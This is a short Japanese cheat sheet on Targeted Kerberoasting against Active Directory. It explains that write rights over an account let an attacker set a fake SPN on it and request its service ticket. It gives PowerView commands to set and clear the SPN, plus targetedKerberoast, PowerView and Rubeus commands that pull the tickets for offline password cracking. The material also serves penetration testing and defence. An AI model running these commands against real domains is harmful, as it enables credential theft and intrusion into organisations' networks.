# TargetedKerberoast

この悪用は、`GenericAll`、`GenericWrite`、`WriteProperty`、またはValidated-SPNをターゲットに持つオブジェクトを制御するときに実行できる。通常、`Account Operator`グループのメンバはこれらの権限を持つ。
攻撃者はそのアカウントに SPN (ServicePrincipalName) を追加できる。アカウントがSPNを持つと、そのアカウントはKerberoastingに対して脆弱になる。

```
# 対象アカウントにSPNがないことを確認
Get-DomainUser '<USERNAME>' | Select serviceprincipalname

# SPNを設定する
Set-DomainObject -Identity '<USERNAME>' -Set @{serviceprincipalname="fake/NOTHING"}

# 対象アカウントのSPNをクリアする
Get-DomainUser '<USERNAME>' | Select serviceprincipalname Set-DomainObject -Identity '<USERNAME>' -Clear serviceprincipalname
```

# Targeted Kerberoastingを実行する

## Linux

```
targetedKerberoast -v -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' --dc-ip <DC_IP>
```

## Windows

### PowerView

```
Get-DomainUser '<USERNAME>' | Get-DomainSPNTicket | fl
```

### Rubeus

```
Rubeus.exe kerberoast /user:<USERNAME> /nowrap
```